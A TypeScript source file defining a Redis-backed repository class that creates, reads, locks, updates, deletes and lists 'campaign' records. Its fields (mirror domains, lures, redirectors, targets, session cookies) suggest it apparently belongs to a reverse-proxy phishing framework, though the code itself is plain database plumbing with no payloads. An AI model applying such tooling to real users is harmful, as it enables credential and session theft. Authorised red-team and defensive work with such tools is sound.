import { DIContainer, randomIdent } from '@famir/common'
import { CONFIG, Config } from '@famir/config'
import { LOGGER, Logger } from '@famir/logger'
import { Validator, VALIDATOR } from '@famir/validator'
import {
  DATABASE_CONNECTOR,
  DatabaseConnector,
  RedisDatabaseConnection
} from '../../database-connector.js'
import { RedisDatabaseConfig } from '../../database.js'
import { CampaignModel, FullCampaignModel } from '../../models/index.js'
import { RedisBaseRepository } from '../base/index.js'
import { RawCampaign, RawFullCampaign } from './campaign.functions.js'
import { CAMPAIGN_REPOSITORY, CampaignRepository } from './campaign.js'
import { campaignSchemas } from './campaign.schemas.js'

export class RedisCampaignRepository extends RedisBaseRepository implements CampaignRepository {
  static inject(container: DIContainer) {
    container.registerSingleton<CampaignRepository>(
      CAMPAIGN_REPOSITORY,
      (c) =>
        new RedisCampaignRepository(
          c.resolve<Validator>(VALIDATOR),
          c.resolve<Config<RedisDatabaseConfig>>(CONFIG),
          c.resolve<Logger>(LOGGER),
          c.resolve<DatabaseConnector>(DATABASE_CONNECTOR).connection<RedisDatabaseConnection>()
        )
    )
  }

  constructor(
    validator: Validator,
    config: Config<RedisDatabaseConfig>,
    logger: Logger,
    connection: RedisDatabaseConnection
  ) {
    super(validator, config, logger, connection, 'campaign')

    this.validator.addSchemas(campaignSchemas)

    this.logger.debug(`CampaignRepository initialized`)
  }

  async create(
    campaignId: string,
    mirrorDomain: string,
    description: string,
    lockTimeout: number,
    landingUpgradePath: string,
    sessionCookieName: string,
    sessionExpire: number,
    newSessionExpire: number,
    messageExpire: number
  ): Promise<void> {
    try {
      const statusReply = await this.connection.campaign.create_campaign(
        this.options.prefix,
        campaignId,
        mirrorDomain,
        description,
        lockTimeout,
        landingUpgradePath,
        sessionCookieName,
        sessionExpire,
        newSessionExpire,
        messageExpire
      )

      const mesg = this.handleStatusReply(statusReply)

      this.logger.info(mesg, { campaign: { campaignId, mirrorDomain } })
    } catch (error) {
      this.raiseError(error, 'create', { campaignId, mirrorDomain })
    }
  }

  async read(campaignId: string): Promise<FullCampaignModel | null> {
    try {
      const rawModel = await this.connection.campaign.read_full_campaign(
        this.options.prefix,
        campaignId
      )

      return this.buildFullModel(rawModel)
    } catch (error) {
      this.raiseError(error, 'read', { campaignId })
    }
  }

  async lock(campaignId: string): Promise<string> {
    const lockSecret = randomIdent()

    try {
      const statusReply = await this.connection.campaign.lock_campaign(
        this.options.prefix,
        campaignId,
        lockSecret
      )

      const mesg = this.handleStatusReply(statusReply)

      this.logger.info(mesg, { campaign: { campaignId } })

      return lockSecret
    } catch (error) {
      this.raiseError(error, 'lock', { campaignId })
    }
  }

  async unlock(campaignId: string, lockSecret: string): Promise<void> {
    try {
      const statusReply = await this.connection.campaign.unlock_campaign(
        this.options.prefix,
        campaignId,
        lockSecret
      )

      const mesg = this.handleStatusReply(statusReply)

      this.logger.info(mesg, { campaign: { campaignId } })
    } catch (error) {
      this.raiseError(error, 'unlock', { campaignId })
    }
  }

  async update(
    campaignId: string,
    description: string | null | undefined,
    sessionExpire: number | null | undefined,
    newSessionExpire: number | null | undefined,
    messageExpire: number | null | undefined,
    lockSecret: string
  ): Promise<void> {
    try {
      const statusReply = await this.connection.campaign.update_campaign(
        this.options.prefix,
        campaignId,
        description,
        sessionExpire,
        newSessionExpire,
        messageExpire,
        lockSecret
      )

      const mesg = this.handleStatusReply(statusReply)

      this.logger.info(mesg, { campaign: { campaignId } })
    } catch (error) {
      this.raiseError(error, 'update', { campaignId })
    }
  }

  async delete(campaignId: string, lockSecret: string): Promise<void> {
    try {
      const statusReply = await this.connection.campaign.delete_campaign(
        this.options.prefix,
        campaignId,
        lockSecret
      )

      const mesg = this.handleStatusReply(statusReply)

      this.logger.info(mesg, { campaign: { campaignId } })
    } catch (error) {
      this.raiseError(error, 'delete', { campaignId })
    }
  }

  async list(): Promise<CampaignModel[]> {
    try {
      const index = await this.connection.campaign.read_campaign_index(this.options.prefix)

      this.validateArrayStringsReply(index)

      const rawCollection = await Promise.all(
        index.map((campaignId) =>
          this.connection.campaign.read_campaign(this.options.prefix, campaignId)
        )
      )

      return this.buildCollection(rawCollection)
    } catch (error) {
      this.raiseError(error, 'list', null)
    }
  }

  protected buildModel(rawModel: unknown): CampaignModel | null {
    if (rawModel === null) {
      return null
    }

    this.validateRawData<RawCampaign>('database-raw-campaign', rawModel)

    return new CampaignModel(
      rawModel.campaign_id,
      rawModel.mirror_domain,
      !!rawModel.is_locked,
      rawModel.session_count,
      rawModel.message_count,
      new Date(rawModel.created_at),
      new Date(rawModel.updated_at)
    )
  }

  protected buildFullModel(rawModel: unknown): FullCampaignModel | null {
    if (rawModel === null) {
      return null
    }

    this.validateRawData<RawFullCampaign>('database-raw-full-campaign', rawModel)

    return new FullCampaignModel(
      rawModel.campaign_id,
      rawModel.mirror_domain,
      rawModel.description,
      rawModel.lock_timeout,
      rawModel.landing_upgrade_path,
      rawModel.session_cookie_name,
      rawModel.session_expire,
      rawModel.new_session_expire,
      rawModel.message_expire,
      !!rawModel.is_locked,
      rawModel.proxy_count,
      rawModel.target_count,
      rawModel.redirector_count,
      rawModel.lure_count,
      rawModel.session_count,
      rawModel.message_count,
      new Date(rawModel.created_at),
      new Date(rawModel.updated_at)
    )
  }

  protected buildCollection(rawCollection: unknown): CampaignModel[] {
    this.validateArrayReply(rawCollection)

    return rawCollection
      .map((rawModel) => this.buildModel(rawModel))
      .filter(CampaignModel.isNotNull)
  }
}
